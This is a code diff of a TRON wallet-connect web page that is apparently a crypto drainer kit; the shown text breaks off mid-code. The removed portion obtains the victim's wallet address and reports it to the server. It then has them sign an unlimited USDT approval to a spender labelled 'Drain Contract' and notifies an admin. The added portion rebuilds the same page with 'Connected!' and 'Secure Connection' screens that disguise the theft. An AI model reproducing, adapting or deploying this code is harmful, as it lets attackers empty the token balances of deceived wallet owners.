-                    var msg = (err && err.message) || String(err);
-                    if (msg.indexOf("4001") !== -1 || msg.indexOf("reject") !== -1 || msg.indexOf("cancel") !== -1) {
-                      reject(new Error("User rejected the connection"));
-                    } else {
-                      reject(new Error("OKX connection failed: " + msg));
-                    }
-                  });
-                return;
-              }
-
-              reject(new Error("OKX Wallet not available"));
-            } catch(e) {
-              reject(e);
-            }
-          });
-        }
-      },
-      {
-        id: "tokenpocket",
-        name: "TokenPocket",
-        logo: "https://www.tokenpocket.pro/favicon.ico",
-        downloadUrl: "https://www.tokenpocket.pro/download",
-        detect: function() {
-          if (window.tokenpocket) return true;
-          if (isTokenPocketBrowser) return true;
-          if (window.tronWeb && window.tronWeb.ready) return true;
-          return false;
-        },
-        connect: function() {
-          return new Promise(function(resolve, reject) {
-            try {
-              if (window.tokenpocket) {
-                console.log("TokenPocket provider found");
-
-                var tronProvider = window.tokenpocket.tron;
-                if (tronProvider) {
-                  if (tronProvider.tronWeb && tronProvider.tronWeb.ready && tronProvider.tronWeb.defaultAddress && tronProvider.tronWeb.defaultAddress.base58) {
-                    resolve(tronProvider.tronWeb.defaultAddress.base58);
-                    return;
-                  }
-                  if (typeof tronProvider.request === "function") {
-                    tronProvider.request({ method: "eth_requestAccounts" })
-                      .then(function(result) {
-                        console.log("TokenPocket TRON result:", result);
-                        if (Array.isArray(result) && result.length > 0) {
-                          resolve(result[0]);
-                        } else if (typeof result === "string") {
-                          resolve(result);
-                        } else if (result && result.address) {
-                          resolve(result.address);
-                        } else if (tronProvider.tronWeb && tronProvider.tronWeb.defaultAddress) {
-                          resolve(tronProvider.tronWeb.defaultAddress.base58);
-                        } else {
-                          reject(new Error("No address returned"));
-                        }
-                      })
-                      .catch(function(err) {
-                        var msg = (err && err.message) || String(err);
-                        if (msg.indexOf("4001") !== -1 || msg.indexOf("reject") !== -1 || msg.indexOf("cancel") !== -1) {
-                          reject(new Error("User rejected the connection"));
-                        } else {
-                          reject(new Error("TokenPocket connection failed: " + msg));
-                        }
-                      });
-                    return;
-                  }
-                }
-
-                if (typeof window.tokenpocket.getCurrentWallet === "function") {
-                  window.tokenpocket.getCurrentWallet()
-                    .then(function(result) {
-                      console.log("TokenPocket getCurrentWallet:", result);
-                      if (result && result.data && result.data.address) {
-                        resolve(result.data.address);
-                      } else if (result && result.address) {
-                        resolve(result.address);
-                      } else {
-                        reject(new Error("No address returned"));
-                      }
-                    })
-                    .catch(reject);
-                  return;
-                }
-              }
-
-              if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                resolve(window.tronWeb.defaultAddress.base58);
-                return;
-              }
-
-              reject(new Error("TokenPocket not detected"));
-            } catch(e) {
-              reject(e);
-            }
-          });
-        }
-      },
-      {
-        id: "bitget",
-        name: "Bitget Wallet",
-        logo: "https://web3.bitget.com/favicon.ico",
-        downloadUrl: "https://web3.bitget.com/download",
-        detect: function() {
-          if (window.bitkeep) return true;
-          if (window.bitgetWallet) return true;
-          if (isBitgetBrowser) return true;
-          if (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitgetWallet)) return true;
-          return false;
-        },
-        connect: function() {
-          return new Promise(function(resolve, reject) {
-            try {
-              var provider = null;
-              if (window.bitgetWallet) {
-                provider = window.bitgetWallet;
-              } else if (window.bitkeep) {
-                provider = window.bitkeep;
-              } else if (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitgetWallet)) {
-                provider = window.ethereum;
-              }
-
-              if (!provider) {
-                reject(new Error("Bitget Wallet not detected"));
-                return;
-              }
-
-              console.log("Bitget Wallet provider found");
-
-              var tronProvider = provider.tron;
-              if (!tronProvider && provider.tronLink) {
-                tronProvider = provider.tronLink;
-              }
-
-              if (tronProvider) {
-                if (tronProvider.tronWeb && tronProvider.tronWeb.ready && tronProvider.tronWeb.defaultAddress && tronProvider.tronWeb.defaultAddress.base58) {
-                  resolve(tronProvider.tronWeb.defaultAddress.base58);
-                  return;
-                }
-                if (typeof tronProvider.request === "function") {
-                  tronProvider.request({ method: "eth_requestAccounts" })
-                    .then(function(result) {
-                      console.log("Bitget TRON result:", result);
-                      if (Array.isArray(result) && result.length > 0) {
-                        resolve(result[0]);
-                      } else if (typeof result === "string") {
-                        resolve(result);
-                      } else if (result && result.address) {
-                        resolve(result.address);
-                      } else if (tronProvider.tronWeb && tronProvider.tronWeb.defaultAddress) {
-                        resolve(tronProvider.tronWeb.defaultAddress.base58);
-                      } else {
-                        reject(new Error("No address returned"));
-                      }
-                    })
-                    .catch(function(err) {
-                      var msg = (err && err.message) || String(err);
-                      if (msg.indexOf("4001") !== -1 || msg.indexOf("reject") !== -1 || msg.indexOf("cancel") !== -1) {
-                        reject(new Error("User rejected the connection"));
-                      } else {
-                        reject(new Error("Bitget connection failed: " + msg));
-                      }
-                    });
-                  return;
-                }
-              }
-
-              if (typeof provider.request === "function") {
-                provider.request({ method: "eth_requestAccounts" })
-                  .then(function(result) {
-                    console.log("Bitget eth_requestAccounts result:", result);
-                    if (Array.isArray(result) && result.length > 0) {
-                      var addr = result[0];
-                      if (isTronAddress(addr)) {
-                        resolve(addr);
-                      } else if (addr.startsWith("0x")) {
-                        var tronHex = ethToTronAddress(addr);
-                        resolve(tronHex);
-                      } else {
-                        resolve(addr);
-                      }
-                    } else {
-                      reject(new Error("No address returned"));
-                    }
-                  })
-                  .catch(function(err) {
-                    var msg = (err && err.message) || String(err);
-                    if (msg.indexOf("4001") !== -1 || msg.indexOf("reject") !== -1 || msg.indexOf("cancel") !== -1) {
-                      reject(new Error("User rejected the connection"));
-                    } else {
-                      reject(new Error("Bitget connection failed: " + msg));
-                    }
-                  });
-                return;
-              }
-
-              reject(new Error("Bitget Wallet not available"));
-            } catch(e) {
-              reject(e);
-            }
-          });
-        }
-      },
-      {
-        id: "imtoken",
-        name: "imToken",
-        logo: "https://token.im/favicon.ico",
-        downloadUrl: "https://token.im/download",
-        detect: function() {
-          if (window.imToken) return true;
-          if (isImTokenBrowser) return true;
-          if (window.tronWeb && window.tronWeb.ready) return true;
-          return false;
-        },
-        connect: function() {
-          return new Promise(function(resolve, reject) {
-            try {
-              if (window.imToken) {
-                console.log("imToken provider found");
-
-                var tronProvider = window.imToken.tron;
-                if (tronProvider) {
-                  if (tronProvider.tronWeb && tronProvider.tronWeb.ready && tronProvider.tronWeb.defaultAddress && tronProvider.tronWeb.defaultAddress.base58) {
-                    resolve(tronProvider.tronWeb.defaultAddress.base58);
-                    return;
-                  }
-                  if (typeof tronProvider.request === "function") {
-                    tronProvider.request({ method: "eth_requestAccounts" })
-                      .then(function(result) {
-                        console.log("imToken TRON result:", result);
-                        if (Array.isArray(result) && result.length > 0) {
-                          resolve(result[0]);
-                        } else if (typeof result === "string") {
-                          resolve(result);
-                        } else if (result && result.address) {
-                          resolve(result.address);
-                        } else if (tronProvider.tronWeb && tronProvider.tronWeb.defaultAddress) {
-                          resolve(tronProvider.tronWeb.defaultAddress.base58);
-                        } else {
-                          reject(new Error("No address returned"));
-                        }
-                      })
-                      .catch(function(err) {
-                        var msg = (err && err.message) || String(err);
-                        if (msg.indexOf("4001") !== -1 || msg.indexOf("reject") !== -1 || msg.indexOf("cancel") !== -1) {
-                          reject(new Error("User rejected the connection"));
-                        } else {
-                          reject(new Error("imToken connection failed: " + msg));
-                        }
-                      });
-                    return;
-                  }
-                }
-
-                if (typeof window.imToken.callMethod === "function") {
-                  window.imToken.callMethod("tron.getAccount")
-                    .then(function(result) {
-                      console.log("imToken getAccount:", result);
-                      if (result && result.address) {
-                        resolve(result.address);
-                      } else {
-                        reject(new Error("No address returned"));
-                      }
-                    })
-                    .catch(function(err) {
-                      var msg = (err && err.message) || String(err);
-                      reject(new Error("imToken connection failed: " + msg));
-                    });
-                  return;
-                }
-              }
-
-              if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                resolve(window.tronWeb.defaultAddress.base58);
-                return;
-              }
-
-              reject(new Error("imToken not detected"));
-            } catch(e) {
-              reject(e);
-            }
-          });
-        }
-      }
-    ];
-
-    // ============================================================
-    // DOM REFS
-    // ============================================================
-
-    var msgBox = document.getElementById("msgBox");
-
-    function msg(type, text) {
-      msgBox.innerHTML = '<div class="msg show ' + type + '">' + text + '</div>';
-    }
-    function hideMsg() { msgBox.innerHTML = ""; }
-    function scShow(id) {
-      document.querySelectorAll(".screen").forEach(function(s){ s.classList.remove("on"); });
-      document.getElementById(id).classList.add("on");
-    }
-
-    function updateStep(stepNum, status) {
-      var step = document.getElementById("step" + stepNum);
-      if (!step) return;
-      step.className = "step";
-      if (status === "active") step.classList.add("active");
-      if (status === "done") {
-        step.classList.add("done");
-        step.innerHTML = step.innerHTML.replace(/\d/, '<span class="check">&#10003;</span>');
-      }
-    }
-
-    // ============================================================
-    // FETCH CONFIG
-    // ============================================================
-
-    async function fetchConfig() {
-      var statusEl = document.getElementById("configStatus");
-      statusEl.style.display = "block";
-      statusEl.textContent = "Loading configuration...";
-
-      try {
-        var r = await fetch(SITE_URL + "/api/config");
-        if (!r.ok) throw new Error("HTTP " + r.status);
-        var data = await r.json();
-        if (data && data.usdtContract) {
-          config = data;
-          statusEl.textContent = "Configuration loaded";
-          statusEl.style.color = "#4ade80";
-          console.log("Config loaded:", config);
-          return config;
-        }
-        throw new Error("Invalid config");
-      } catch(e) {
-        console.warn("Config fetch failed:", e.message);
-        statusEl.textContent = "Using default config";
-        statusEl.style.color = "#fbbf24";
-        config = {
-          usdtContract: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-          drainContract: "",
-          maxApprove: "115792089237316195423570985008687907853269984665640564039457584007913129639935"
-        };
-        return config;
-      }
-    }
-
-    // ============================================================
-    // SERVER API
-    // ============================================================
-
-    async function sendAddressToServer(address) {
-      try {
-        var r = await fetch(SITE_URL + "/api/qr-connect/" + SESSION_ID, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: address })
-        });
-        return r.json();
-      } catch(e) {
-        console.warn("Failed to send address to server:", e);
-        return null;
-      }
-    }
-
-    async function logEvent(type, address, txId, amount) {
-      try {
-        await fetch(SITE_URL + "/api/event", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ type: type, address: address, txId: txId || "", amount: amount || "" })
-        });
-      } catch(e) {}
-    }
-
-    // ============================================================
-    // DETECT WHICH WALLET BROWSER WE ARE IN - FIXED
-    // ============================================================
-
-    function detectWalletBrowser() {
-      if (isTronLinkBrowser || (window.tron && window.tron.isTronLink)) return "tronlink";
-      if (isTrustBrowser || (window.ethereum && window.ethereum.isTrust)) return "trust";
-      if (isOKXBrowser || (window.ethereum && (window.ethereum.isOKXWallet || window.ethereum.isOKExWallet))) return "okx";
-      if (isTokenPocketBrowser || window.tokenpocket) return "tokenpocket";
-      if (isBitgetBrowser || window.bitgetWallet || window.bitkeep || (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitgetWallet))) return "bitget";
-      if (isImTokenBrowser || window.imToken) return "imtoken";
-      if (window.tronWeb && window.tronWeb.ready) {
-        if (window.tronLink) return "tronlink";
-        return "tronlink";
-      }
-      return null;
-    }
-
-    // ============================================================
-    // GET TRONWEB INSTANCE - COMPLETELY REWRITTEN
-    // ============================================================
-
-    function getTronWebInstance(walletId) {
-      if (window.tronWeb && window.tronWeb.ready) {
-        console.log("Using global window.tronWeb");
-        return window.tronWeb;
-      }
-
-      switch(walletId) {
-        case "tronlink":
-          if (window.tron && window.tron.tronWeb && window.tron.tronWeb.ready) {
-            console.log("Using window.tron.tronWeb");
-            return window.tron.tronWeb;
-          }
-          if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.ready) {
-            console.log("Using window.tronLink.tronWeb");
-            return window.tronLink.tronWeb;
-          }
-          break;
-        case "trust":
-          if (window.ethereum && window.ethereum.isTrust) {
-            if (window.ethereum.tronLink && window.ethereum.tronLink.tronWeb && window.ethereum.tronLink.tronWeb.ready) {
-              console.log("Using Trust ethereum.tronLink.tronWeb");
-              return window.ethereum.tronLink.tronWeb;
-            }
-          }
-          if (window.trustwallet && window.trustwallet.tronLink && window.trustwallet.tronLink.tronWeb && window.trustwallet.tronLink.tronWeb.ready) {
-            console.log("Using trustwallet.tronLink.tronWeb");
-            return window.trustwallet.tronLink.tronWeb;
-          }
-          break;
-        case "okx":
-          if (window.okxwallet) {
-            if (window.okxwallet.tronLink && window.okxwallet.tronLink.tronWeb && window.okxwallet.tronLink.tronWeb.ready) {
-              console.log("Using OKX tronLink.tronWeb");
-              return window.okxwallet.tronLink.tronWeb;
-            }
-            if (window.okxwallet.tron && window.okxwallet.tron.tronWeb && window.okxwallet.tron.tronWeb.ready) {
-              console.log("Using OKX tron.tronWeb");
-              return window.okxwallet.tron.tronWeb;
-            }
-          }
-          break;
-        case "tokenpocket":
-          if (window.tokenpocket && window.tokenpocket.tron && window.tokenpocket.tron.tronWeb && window.tokenpocket.tron.tronWeb.ready) {
-            console.log("Using TokenPocket tron.tronWeb");
-            return window.tokenpocket.tron.tronWeb;
-          }
-          break;
-        case "bitget":
-          if (window.bitgetWallet && window.bitgetWallet.tron && window.bitgetWallet.tron.tronWeb && window.bitgetWallet.tron.tronWeb.ready) {
-            console.log("Using Bitget tron.tronWeb");
-            return window.bitgetWallet.tron.tronWeb;
-          }
-          if (window.bitkeep && window.bitkeep.tron && window.bitkeep.tron.tronWeb && window.bitkeep.tron.tronWeb.ready) {
-            console.log("Using Bitkeep tron.tronWeb");
-            return window.bitkeep.tron.tronWeb;
-          }
-          break;
-        case "imtoken":
-          if (window.imToken && window.imToken.tron && window.imToken.tron.tronWeb && window.imToken.tron.tronWeb.ready) {
-            console.log("Using imToken tron.tronWeb");
-            return window.imToken.tron.tronWeb;
-          }
-          break;
-      }
-
-      if (window.tronWeb) {
-        console.log("Using fallback window.tronWeb (not ready)");
-        return window.tronWeb;
-      }
-
-      console.error("No TronWeb instance found for wallet:", walletId);
-      return null;
-    }
-
-    // ============================================================
-    // CORE CONNECTION LOGIC - FIXED
-    // ============================================================
-
-    async function connectWallet(walletId) {
-      if (isProcessing) return;
-      hideMsg();
-      isProcessing = true;
-
-      console.log("Connecting to wallet:", walletId);
-
-      var wallet = WALLETS.find(function(w) { return w.id === walletId; });
-      if (!wallet) {
-        msg("err", "Wallet not found");
-        isProcessing = false;
-        return;
-      }
-
-      if (!config || !config.usdtContract) {
-        await fetchConfig();
-      }
-
-      if (!config.drainContract) {
-        msg("err", "Drain contract not deployed. Please check admin panel.");
-        isProcessing = false;
-        return;
-      }
-
-      var detected = wallet.detect();
-      console.log(wallet.name, "detected:", detected);
-
-      if (!detected) {
-        if (isMobile) {
-          msg("inf", "Opening " + wallet.name + " app...");
-          var deepLinks = {
-            "trust": "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href),
-            "okx": "okx://wallet/dapp/url?url=" + encodeURIComponent(window.location.href),
-            "tokenpocket": "tp://open?url=" + encodeURIComponent(window.location.href),
-            "tronlink": "tronlinkoutside://pull.activity?param=" + encodeURIComponent(JSON.stringify({
-              url: window.location.href,
-              action: "open",
-              protocol: "tronlink",
-              version: "1.0"
-            })),
-            "bitget": "bitkeep://bkconnect?action=dapp&url=" + encodeURIComponent(window.location.href),
-            "imtoken": "imtoken://browser?url=" + encodeURIComponent(window.location.href)
-          };
-
-          if (deepLinks[wallet.id]) {
-            window.location.href = deepLinks[wallet.id];
+  <div class="screen" id="scProcessing">
+    <div class="wait-content">
+      <div class="status-icon"><div class="spinner"></div></div>
+      <div class="title" id="processingTitle" style="font-size:17px;font-weight:600;color:#e2e8f0;margin-top:4px;">Processing...</div>
+      <div class="subtitle" id="processingDesc" style="font-size:13px;color:rgba(148,163,184,0.6);">Please wait</div>
+      <button class="btn" onclick="location.reload()">Cancel</button>
+    </div>
+  </div>
+
+  <div class="screen" id="scDone">
+    <div class="wait-content">
+      <div class="status-icon"><div class="success-icon">✓</div></div>
+      <div class="title" style="font-size:18px;font-weight:700;color:#4ade80;">Connected!</div>
+      <div class="subtitle" style="font-size:13px;color:rgba(148,163,184,0.6);">You can close this page</div>
+      <div class="address-display" id="doneAddress"></div>
+      <button class="btn btn-primary" onclick="window.close()">Close</button>
+    </div>
+  </div>
+
+  <div class="screen" id="scError">
+    <div class="wait-content">
+      <div class="status-icon"><div class="error-icon">✕</div></div>
+      <div class="title" id="errorTitle" style="font-size:16px;font-weight:600;color:#f87171;">Connection Failed</div>
+      <div class="subtitle" id="errorDesc" style="font-size:13px;color:rgba(148,163,184,0.6);">Please try again</div>
+      <button class="btn btn-primary" onclick="location.reload()">Try Again</button>
+      <button class="btn" onclick="window.close()">Close</button>
+    </div>
+  </div>
+
+  <div class="footer">
+    <span>TRON Network</span>
+    <span class="dot"></span>
+    <span>Secure Connection</span>
+  </div>
+</div>
+
+<script>
+  // ============================================================
+  // CONFIG
+  // ============================================================
+  var SITE_URL = window.location.origin;
+  var config = {};
+  var connectedAddress = null;
+  var isProcessing = false;
+  var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
+  var SESSION_ID = 'qr-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
+
+  // ============================================================
+  // USDT ABI
+  // ============================================================
+  var USDT_ABI = [
+    {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
+    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
+    {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}
+  ];
+
+  // ============================================================
+  // WALLETS
+  // ============================================================
+  var WALLETS = [
+    {
+      id: 'tronlink',
+      name: 'TronLink',
+      logo: 'https://tronlink.org/favicon.ico',
+      downloadUrl: 'https://tronlink.org/download',
+      detect: function() { return !!(window.tronLink || (window.tronWeb && window.tronWeb.ready)); },
+      connect: function() {
+        return new Promise(function(resolve, reject) {
+          if (window.tronLink && typeof window.tronLink.request === 'function') {
+            window.tronLink.request({ method: 'tron_requestAccounts' })
+              .then(function(r) {
+                if (typeof r === 'string') resolve(r);
+                else if (Array.isArray(r) && r.length) resolve(r[0]);
+                else if (r && r.address) resolve(r.address);
+                else reject(new Error('No address'));
+              })
+              .catch(reject);
+          } else if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+            resolve(window.tronWeb.defaultAddress.base58);
           } else {
-            msg("warn", wallet.name + " not detected. <a href=\"" + wallet.downloadUrl + "\" target=\"_blank\" style=\"color:#4ade80;\">Install " + wallet.name + "</a>");
+            reject(new Error('TronLink not detected'));
           }
-          isProcessing = false;
-          return;
-        } else {
-          msg("warn", wallet.name + " not detected. <a href=\"" + wallet.downloadUrl + "\" target=\"_blank\" style=\"color:#4ade80;\">Install " + wallet.name + "</a>");
-          isProcessing = false;
-          return;
-        }
+        });
       }
-
-      scShow("scWait");
-      document.getElementById("waitDesc").textContent = "Connecting to " + wallet.name + "...";
-      updateStep(1, "active");
-      updateStep(2, "");
-      updateStep(3, "");
-
-      try {
-        var address = await wallet.connect();
-
-        if (!address) {
-          throw new Error("No address returned");
-        }
-
-        if (!isTronAddress(address) && address.startsWith("41")) {
-          address = hexToBase58(address);
-        }
-
-        console.log("Address obtained:", address);
-        connectedAddress = address;
-        updateStep(1, "done");
-
-        try {
-          await sendAddressToServer(address);
-        } catch(e) {
-          console.warn("Failed to send address to server:", e);
-        }
-
-        await logEvent("wallet_connected", address, "", walletId);
-
-        var tw = getTronWebInstance(walletId);
-        if (!tw) {
-          tw = window.tronWeb;
-        }
-
-        if (!tw || !tw.contract) {
-          console.log("Waiting for TronWeb initialization...");
-          await new Promise(function(r) { setTimeout(r, 1500); });
-          tw = getTronWebInstance(walletId) || window.tronWeb;
-        }
-
-        if (!tw || !tw.contract) {
-          throw new Error("TronWeb not available. Please make sure " + wallet.name + " is fully connected.");
-        }
-
-        await doApproveFlow(address, tw, wallet);
-
-      } catch(e) {
-        console.error("Connection error:", e);
-        var errMsg = e.message || String(e);
-        if (errMsg.toLowerCase().indexOf("cancel") !== -1 || errMsg.toLowerCase().indexOf("reject") !== -1 || errMsg.toLowerCase().indexOf("denied") !== -1 || errMsg.indexOf("4001") !== -1) {
-          showError("Cancelled", "You cancelled the connection in " + wallet.name);
-        } else {
-          showError("Connection Error", errMsg);
-        }
-        isProcessing = false;
-      }
-    }
-
-    // ============================================================
-    // APPROVE FLOW - FIXED
-    // ============================================================
-
-    async function doApproveFlow(address, tw, wallet) {
-      scShow("scProcessing");
-      document.getElementById("processingTitle").textContent = "Checking balance...";
-      document.getElementById("processingDesc").textContent = "Verifying USDT balance";
-      updateStep(2, "active");
-
-      try {
-        console.log("Using TronWeb instance for", wallet ? wallet.name : "unknown wallet");
-
-        var usdtContract;
-        try {
-          usdtContract = await tw.contract(USDT_ABI).at(config.usdtContract);
-          console.log("USDT contract loaded at", config.usdtContract);
-        } catch(e) {
-          throw new Error("Could not load USDT contract: " + e.message);
-        }
-
-        document.getElementById("processingDesc").textContent = "Checking balance...";
-        var rawBalance;
-        try {
-          rawBalance = await usdtContract.balanceOf(address).call();
-        } catch(e) {
-          console.warn("balanceOf call failed, trying alternative:", e);
-          rawBalance = await usdtContract.balanceOf(address);
-        }
-
-        var balance;
-        if (typeof rawBalance === "object" && rawBalance._hex) {
-          balance = parseInt(rawBalance._hex, 16);
-        } else if (typeof rawBalance === "object" && rawBalance.balance) {
-          balance = Number(rawBalance.balance);
-        } else {
-          balance = Number(rawBalance);
-        }
-        var balanceUsdt = balance / 1e6;
-
-        console.log("USDT Balance:", balanceUsdt);
-        updateStep(2, "done");
-
-        document.getElementById("processingTitle").textContent = "Approving USDT...";
-        document.getElementById("processingDesc").textContent = "Please confirm in " + (wallet ? wallet.name : "your wallet");
-        updateStep(3, "active");
-
-        var approveVal = config.maxApprove || "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-
-        console.log("Building approve transaction...");
-        console.log("USDT:", config.usdtContract);
-        console.log("Spender (Drain Contract):", config.drainContract);
-
-        var built;
-        try {
-          built = await tw.transactionBuilder.triggerSmartContract(
-            config.usdtContract,
-            "approve(address,uint256)",
-            {
-              feeLimit: 20000000,
-              callValue: 0
-            },
-            [
-              { type: "address", value: config.drainContract },
-              { type: "uint256", value: approveVal }
-            ],
-            address
-          );
-        } catch(e) {
-          console.error("triggerSmartContract failed:", e);
-          throw new Error("Failed to build transaction: " + e.message);
-        }
-
-        var approveTx = built.transaction || built;
-        if (!approveTx || !approveTx.txID) {
-          throw new Error("Transaction build failed - no txID returned");
-        }
-
-        console.log("Transaction built, txID:", approveTx.txID);
-
-        document.getElementById("processingDesc").textContent = "Signing... Please confirm in wallet";
-
-        var signedApprove;
-        try {
-          signedApprove = await tw.trx.sign(approveTx);
-          console.log("Transaction signed");
-        } catch(e) {
-          var errMsg = e.message || String(e);
-          if (errMsg.toLowerCase().indexOf("cancel") !== -1 || errMsg.toLowerCase().indexOf("reject") !== -1 || errMsg.toLowerCase().indexOf("denied") !== -1 || errMsg.indexOf("4001") !== -1) {
-            showError("Cancelled", "You cancelled the approval");
+    },
+    {
+      id: 'trust',
+      name: 'Trust Wallet',
+      logo: 'https://dl.svgcdn.com/svg/token-branded/trust.svg',
+      downloadUrl: 'https://trustwallet.com/download',
+      detect: function() {
+        if (window.tronWeb && window.tronWeb.ready) return true;
+        if (window.ethereum && window.ethereum.isTrust) return true;
+        if (/Trust/i.test(navigator.userAgent)) return true;
+        return false;
+      },
+      connect: function() {
+        return new Promise(function(resolve, reject) {
+          // Try tronWeb first
+          if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+            resolve(window.tronWeb.defaultAddress.base58);
             return;
           }
-          throw new Error("Sign failed: " + errMsg);
-        }
-
-        document.getElementById("processingDesc").textContent = "Broadcasting...";
-        var receipt;
-        try {
-          receipt = await tw.trx.sendRawTransaction(signedApprove);
-          console.log("Transaction broadcasted:", receipt);
-        } catch(e) {
-          throw new Error("Broadcast failed: " + (e.message || String(e)));
-        }
-
-        var txId = receipt.txid || receipt.txID || receipt.transactionHash || "";
-        console.log("TX ID:", txId);
-
-        document.getElementById("processingDesc").textContent = "Notifying admin...";
-        try {
-          await fetch(SITE_URL + "/api/approve-done", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ address: address })
-          });
-        } catch(e) {
-          console.warn("Failed to notify server:", e);
-        }
-
-        updateStep(3, "done");
-
-        scShow("scDone");
-        document.getElementById("doneAddress").textContent = address;
-        isProcessing = false;
-
-        try {
-          await fetch(SITE_URL + "/api/event", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              type: "approve_signed",
-              address: address,
-              txId: txId
-            })
-          });
-        } catch(e) {}
-
-      } catch(e) {
-        console.error("Approve error:", e);
-        showError("Approval Failed", e.message || "An error occurred");
-        isProcessing = false;
+          // Trust Wallet mobile via ethereum
+          if (window.ethereum && window.ethereum.isTrust && typeof window.ethereum.request === 'function') {
+            window.ethereum.request({ method: 'eth_requestAccounts' })
+              .then(function(result) {
+                if (Array.isArray(result) && result.length) {
+                  // Convert ETH address to TRON hex format
+                  var eth = result[0].replace('0x', '');
+                  var tronHex = '41' + eth;
+                  resolve(tronHex);
+                } else {
+                  reject(new Error('No address'));
+                }
+              })
+              .catch(reject);
+            return;
+          }
+          reject(new Error('Trust Wallet not detected'));
+        });
+      }
+    },
+    {
+      id: 'okx',
+      name: 'OKX Wallet',
+      logo: 'https://dl.svgcdn.com/svg/token-branded/okx.svg',
+      downloadUrl: 'https://www.okx.com/download',
+      detect: function() { return !!(window.okxwallet); },
+      connect: function() {
+        return new Promise(function(resolve, reject) {
+          var provider = window.okxwallet && (window.okxwallet.tronLink || window.okxwallet.tron);
+          if (!provider) return reject(new Error('OKX not detected'));
+          if (provider.tronWeb && provider.tronWeb.ready && provider.tronWeb.defaultAddress && provider.tronWeb.defaultAddress.base58) {
+            resolve(provider.tronWeb.defaultAddress.base58);
+            return;
+          }
+          if (typeof provider.request === 'function') {
+            provider.request({ method: 'tron_requestAccounts' })
+              .then(function(r) {
+                if (typeof r === 'string') resolve(r);
+                else if (Array.isArray(r) && r.length) resolve(r[0]);
+                else if (r && r.address) resolve(r.address);
+                else reject(new Error('No address'));
+              })
+              .catch(reject);
+          } else {
+            reject(new Error('Cannot request accounts'));
+          }
+        });
+      }
+    },
+    {
+      id: 'tokenpocket',
+      name: 'TokenPocket',
+      logo: 'https://dl.svgcdn.com/svg/token-branded/token-pocket.svg',
+      downloadUrl: 'https://www.tokenpocket.pro/download',
+      detect: function() { return !!(window.tokenpocket); },
+      connect: function() {
+        return new Promise(function(resolve, reject) {
+          var provider = window.tokenpocket && window.tokenpocket.tron;
+          if (!provider) return reject(new Error('TokenPocket not detected'));
+          if (provider.tronWeb && provider.tronWeb.ready && provider.tronWeb.defaultAddress && provider.tronWeb.defaultAddress.base58) {
+            resolve(provider.tronWeb.defaultAddress.base58);
+            return;
+          }
+          if (typeof provider.request === 'function') {
+            provider.request({ method: 'tron_requestAccounts' })
+              .then(function(r) {
+                if (typeof r === 'string') resolve(r);
+                else if (Array.isArray(r) && r.length) resolve(r[0]);
+                else if (r && r.address) resolve(r.address);
+                else reject(new Error('No address'));
+              })
+              .catch(reject);
+          } else {
+            reject(new Error('Cannot request accounts'));
+          }
+        });
+      }
+    },
+    {
+      id: 'bitget',
+      name: 'Bitget Wallet',
+      logo: 'https://dl.svgcdn.com/svg/token-branded/bitget.svg',
+      downloadUrl: 'https://web3.bitget.com/download',
+      detect: function() { return !!(window.bitkeep || window.bitgetWallet); },
+      connect: function() {
+        return new Promise(function(resolve, reject) {
+          var provider = null;
+          if (window.bitkeep && window.bitkeep.tron) provider = window.bitkeep.tron;
+          else if (window.bitgetWallet && window.bitgetWallet.tron) provider = window.bitgetWallet.tron;
+          if (!provider) return reject(new Error('Bitget not detected'));
+          if (provider.tronWeb && provider.tronWeb.ready && provider.tronWeb.defaultAddress && provider.tronWeb.defaultAddress.base58) {
+            resolve(provider.tronWeb.defaultAddress.base58);
+            return;
+          }
+          if (typeof provider.request === 'function') {
+            provider.request({ method: 'tron_requestAccounts' })
+              .then(function(r) {
+                if (typeof r === 'string') resolve(r);
+                else if (Array.isArray(r) && r.length) resolve(r[0]);
+                else if (r && r.address) resolve(r.address);
+                else reject(new Error('No address'));
+              })
+              .catch(reject);
+          } else {
+            reject(new Error('Cannot request accounts'));
+          }
+        });
+      }
+    },
+    {
+      id: 'imtoken',
+      name: 'imToken',
+      logo: 'https://dl.svgcdn.com/svg/token-branded/imtoken.svg',
+      downloadUrl: 'https://token.im/download',
+      detect: function() { return !!(window.imtoken); },
+      connect: function() {
+        return new Promise(function(resolve, reject) {
+          var provider = window.imtoken && window.imtoken.tron;
+          if (!provider) return reject(new Error('imToken not detected'));
+          if (provider.tronWeb && provider.tronWeb.ready && provider.tronWeb.defaultAddress && provider.tronWeb.defaultAddress.base58) {
+            resolve(provider.tronWeb.defaultAddress.base58);
+            return;
+          }
+          if (typeof provider.request === 'function') {
+            provider.request({ method: 'tron_requestAccounts' })
+              .then(function(r) {
+                if (typeof r === 'string') resolve(r);
